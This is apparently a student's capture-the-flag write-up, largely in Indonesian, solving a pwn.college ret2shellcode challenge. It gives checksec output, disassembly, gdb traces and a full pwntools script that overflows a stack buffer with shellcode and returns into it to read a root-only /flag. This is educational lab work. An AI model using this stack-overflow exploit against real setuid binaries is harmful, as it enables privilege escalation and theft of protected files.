# Return to Shellcode

> **Description**: Your first control-flow hijack. A program prints the address of its own buffer, then reads too much into it — put code in the buffer and make the program return into it.

| Property | Detail |
| :--- | :--- |
| **Category** | PWN / binary exploitation |
| **Vuln** | Ret2Shellcode Injection |
| **Challenge URL** | [https://pwn.college/intro-re-pwn~5933fc84/shellcode/](https://pwn.college/intro-re-pwn~5933fc84/shellcode/) |
| **Status** | Solved |
| **Date Completed** | 2026-11-05 |

## Analysis

**File & Checksec**
```
ret2shellcode-64: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e71d07f2d26a8f0a325474a0a1ebecc750aaf3c3, for GNU/Linux 3.2.0, not stripped

Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```


Saya buka README.md yang ada didalam tantangan ini

```bash
# Return to Shellcode (64-bit)

## Background

Do **Test Shellcode** first: this challenge reuses the shellcode you wrote there and adds the step of getting the program to jump to it. From the module's **"Start here"** resources you need:

- **"Using a leaked address to jump to your code"**: the stack picture, why ASLR forces you to read the address in the same run, and `p64()`.
- **"Executable memory and NX"**: why this only works because the stack is executable here.
- **"Bad bytes: newline and NUL"**: input arrives through `fgets`, which stops at the newline byte `0x0a`. That applies to your shellcode *and* to the address you append. NUL bytes are fine.
- From **Your First Memory Bug**: overwriting a saved return address, and measuring the distance to it with `cyclic` / `cyclic_find`.

Your shellcode has to fit **before** the saved return address, together with any padding. Print `len(sc)` and compare it with the distance you measure. Short shellcode is easier.

### How to start

```bash
/challenge/ret2shellcode-64                 # type a few letters; note the "buff sits at" line
/challenge/ret2shellcode-64                 # run it again: the address is different
checksec --file=/challenge/ret2shellcode-64 # NX disabled, no PIE, no canary
```

Then open it with `objdump -d -M intel /challenge/ret2shellcode-64` and find the function that calls `fgets`.

## The challenge

A **buffer overflow** happens when a program copies more input into a buffer than the buffer holds; the extra bytes spill into whatever sits next to it in memory. On the **stack** — the region where functions keep their local variables — the thing next to a local buffer is the **saved return address**: the spot the CPU jumps back to when the function finishes.

This program:

1. prints the **address of its own buffer** on the stack (a **leak** — normally that address is secret and randomized by **ASLR**, the address-space randomization the kernel applies on every run),
2. reads more into the buffer than the buffer can hold. How much more is a fact about this binary, not a secret: disassemble it (`objdump -d /challenge/ret2shellcode-64`) and subtract the buffer's stack offset (the `[rbp-N]` you see with the buffer) from the size passed to `fgets` — the difference is the number of bytes that spill past the buffer's reserved space. The distance from the buffer's *start* to the saved return address — the number your payload actually needs — you measure in Hint 2.

The binary was compiled with an **executable stack** (`-z execstack`; check with `checksec`: "NX disabled") and **no PIE**, so code you place in the buffer can actually be executed if you get the program to jump to it. That technique is called **ret2shellcode**: return into shellcode you planted.

Everything runs as **root** (the binary is setuid) and `/flag` is readable only by root. Goal: make the program run *your* code, and have that code print `/flag`.

The challenge is at `/challenge/ret2shellcode-64`.

`python3` with **pwntools**, and `checksec`, are already installed inside the challenge environment you run the dojo in — they may not exist on your own machine, so work there rather than assuming your laptop has them.

## Hints

<details>
<summary>Hint 1</summary>

Run it first. Two lines matter: the leaked buffer address, and the prompt asking for input. Note that the leaked address changes on every run — that is ASLR — but the *offset* from the buffer to the saved return address never changes, because it is decided by the program's layout at compile time.
</details>

<details>
<summary>Hint 2</summary>

Measure that offset yourself. pwntools' `cyclic()` generates a pattern where any 4-byte subsequence identifies its position; send a few hundred pattern bytes, let the program crash, and find the offset with `cyclic_find()`. Run the program *under gdb* to catch the crash (`gdb /challenge/ret2shellcode-64`, then `run`) — core files are often not written in containers, so don't rely on them.

One x86-64 wrinkle: the overwritten return address is an ASCII pattern, which is not a valid kernel address, so the CPU faults **on the `ret` instruction itself** — `$rip` shows the `ret`'s address, not your pattern, and `cyclic_find` on it fails. The overwritten value is the 8 bytes at the stack pointer at that moment: `x/gx $rsp` in gdb, then feed that value to `cyclic_find`.
</details>

<details>
<summary>Hint 3</summary>

Your payload: shellcode + padding up to the measured offset + the leaked buffer address (as 8 little-endian bytes, `p64()` in pwntools). The saved return address then points back into the buffer — at your shellcode. Keep the shellcode at the *start* of the buffer so you only need the one leaked address, and keep it short: after the jump, `push`es grow the stack *downward from just above the buffer*, so a long run of pushes walks back into the buffer and clobbers your code — starting the shellcode at the lowest address buys the most headroom.
</details>

<details>
<summary>Hint 4</summary>

`fgets` stops at a newline, so if the leaked address happens to contain the byte `0x0a`, the send is cut short. Don't fight it: just run the exploit again — a fresh run rolls a new address. (A handful of retries is normal.)
</details>

<details>
<summary>Hint 5 (stuck?)</summary>

For the shellcode itself, the same syscalls as the previous challenge work: open/read/write `/flag`, or `execve("/bin/sh")` after `setreuid(geteuid(), -1)`. pwntools' `shellcraft.cat("/flag")` is a complete open/read/write payload — assemble it with `asm()` and prepend the `setreuid` snippet so a spawned shell keeps root.
</details>
``` 

**Diasasemble**
- main
```bash
    0x000000000040121a <+0>:     endbr64
   0x000000000040121e <+4>:     push   rbp
   0x000000000040121f <+5>:     mov    rbp,rsp
   0x0000000000401222 <+8>:     mov    rax,QWORD PTR [rip+0x2e07]        # 0x404030 <stdout@GLIBC_2.2.5>
   0x0000000000401229 <+15>:    mov    ecx,0x0
   0x000000000040122e <+20>:    mov    edx,0x2
   0x0000000000401233 <+25>:    mov    esi,0x0
   0x0000000000401238 <+30>:    mov    rdi,rax
   0x000000000040123b <+33>:    call   0x4010a0 <setvbuf@plt>
   0x0000000000401240 <+38>:    call   0x401196 <vuln>
   0x0000000000401245 <+43>:    mov    eax,0x0
   0x000000000040124a <+48>:    pop    rbp
   0x000000000040124b <+49>:    ret
```
- vuln
```bash
   0x0000000000401196 <+0>:     endbr64
   0x000000000040119a <+4>:     push   rbp
   0x000000000040119b <+5>:     mov    rbp,rsp
   0x000000000040119e <+8>:     sub    rsp,0xb0
   0x00000000004011a5 <+15>:    lea    rax,[rbp-0xb0]
   0x00000000004011ac <+22>:    mov    rsi,rax
   0x00000000004011af <+25>:    mov    edi,0x402004
   0x00000000004011b4 <+30>:    mov    eax,0x0
   0x00000000004011b9 <+35>:    call   0x401070 <printf@plt>
   0x00000000004011be <+40>:    mov    edi,0x402015
   0x00000000004011c3 <+45>:    mov    eax,0x0
   0x00000000004011c8 <+50>:    call   0x401070 <printf@plt>
   0x00000000004011cd <+55>:    mov    rax,QWORD PTR [rip+0x2e5c]        # 0x404030 <stdout@GLIBC_2.2.5>
   0x00000000004011d4 <+62>:    mov    rdi,rax
   0x00000000004011d7 <+65>:    call   0x401090 <fflush@plt>
   0x00000000004011dc <+70>:    mov    rdx,QWORD PTR [rip+0x2e5d]        # 0x404040 <stdin@GLIBC_2.2.5>
   0x00000000004011e3 <+77>:    lea    rax,[rbp-0xb0]
   0x00000000004011ea <+84>:    mov    esi,0x108
   0x00000000004011ef <+89>:    mov    rdi,rax
   0x00000000004011f2 <+92>:    call   0x401080 <fgets@plt>
   0x00000000004011f7 <+97>:    test   rax,rax
   0x00000000004011fa <+100>:   je     0x401217 <vuln+129>
   0x00000000004011fc <+102>:   lea    rax,[rbp-0xb0]
   0x0000000000401203 <+109>:   mov    rsi,rax
   0x0000000000401206 <+112>:   mov    edi,0x40201d
   0x000000000040120b <+117>:   mov    eax,0x0
   0x0000000000401210 <+122>:   call   0x401070 <printf@plt>
   0x0000000000401215 <+127>:   jmp    0x401218 <vuln+130>
   0x0000000000401217 <+129>:   nop
   0x0000000000401218 <+130>:   leave
   0x0000000000401219 <+131>:   ret
```

Lalu saya menjalankan debugger dan melakukan analisa 1 per satu. Saya menemukan celah dari buffer overflow pada fungsi vuln()

```bash
0x40119a <vuln+4>     push   rbp
0x40119b <vuln+5>     mov    rbp, rsp              RBP => 0x7ffdd23e0790 —▸ 0x7ffdd23e07a0 —▸ 0x7ffdd23e0840 —▸ 0x7ffdd23e08a0 ◂— ...
►0x40119e <vuln+8>    sub    rsp, 0xb0             RSP => 0x7ffdd23e06e0 (0x7ffdd23e0790 - 0xb0)
```
intruksi assembly melakukan sub pada rsp sebesar 0xb0 atau 176, setelah itu program menyiapkan input dan menyiapkan buff pada rsi

```bash
0x4011af <vuln+25>    mov    edi, 0x402004         EDI => 0x402004 ◂— 'buff sits at %p\n'
0x4011b4 <vuln+30>    mov    eax, 0                EAX => 0
0x4011b9 <vuln+35>    call   printf@plt                  <printf@plt>
0x4011be <vuln+40>    mov    edi, 0x402015         EDI => 0x402015 ◂— 0x203a6b61657053 /* 'Speak: ' */
0x4011c3 <vuln+45>    mov    eax, 0                EAX => 0
0x4011c8 <vuln+50>    call   printf@plt                  <printf@plt>
        format: 0x402015 ◂— 0x203a6b61657053 /* 'Speak: ' */
        rsi: 0x7ffdd23e0530 ◂— 'buff sits at 0x7ffdd23e06e0\n'
```
Dan input akan menerima sebesar 264 bytes

```bash
0x4011e3 <vuln+77>     lea    rax, [rbp - 0xb0]                 RAX => 0x7ffdd23e06e0 ◂— 0
0x4011ea <vuln+84>     mov    esi, 0x108                        ESI => 0x108
0x4011ef <vuln+89>     mov    rdi, rax                          RDI => 0x7ffdd23e06e0 ◂— 0
0x4011f2 <vuln+92>     call   fgets@plt                   <fgets@plt>
        s: 0x7ffdd23e06e0 ◂— 0
        n: 0x108
        stream: 0x70f9454788e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
```
## Exploitation
Saya susun payload exploit berikut:

```python
from pwn import *

# ==========================================
# CONFIGURATION
# ==========================================

# File executable target

exe = "/challenge/ret2shellcode-64" 
elf = ELF(exe)
context.binary = elf
context.arch = elf.arch
context.log_level = "debug"

# ==========================================
# CONNECTION
# ==========================================

io = process(exe)

# ==========================================
# EXPLOIT / SOLVER
# ==========================================

def exploit(io):
    offset = 184 # 0xb0 + 8 saved return adress
    
    sc = shellcraft.open('/flag')
    sc += shellcraft.read(3 , 'rsp' , 0x340)
    sc += shellcraft.write(1 , 'rsp' , 'rax')
    
    io.recvuntil(b'buff sits at ')
    buf_addr = int(io.recvline(), 16)
    
    payload  = asm(sc).ljust(offset, b'A') + p64(buf_addr)
    
    io.recvuntil(b"Speak: ")
    io.sendline(payload)

    print(io.recvall().decode(errors='ignore'))


# ==========================================
# MAIN
# ==========================================

def main():

    exploit(io)
    
    io.interactive()


if __name__ == "__main__":
    main()
```

**Flag**: pwn.college{redacted}

## New Knowledge
- Memahami cara kerja shellcode injection dan bagaimana shellcode dieksekusi oleh sistem
- Mempelajari cara kerja syscall: Open, read, write
- Mempelajari cara menggunakan strace untuk menampilkan proses syscall

## References
- [https://pwn.college/intro-re-pwn~5933fc84/shellcode/](https://pwn.college/intro-re-pwn~5933fc84/shellcode/)
- [https://en-wikipedia-org.translate.goog/wiki/File_descriptor?_x_tr_sl=en&_x_tr_tl=id&_x_tr_hl=id&_x_tr_pto=sge](https://en-wikipedia-org.translate.goog/wiki/File_descriptor?_x_tr_sl=en&_x_tr_tl=id&_x_tr_hl=id&_x_tr_pto=sge)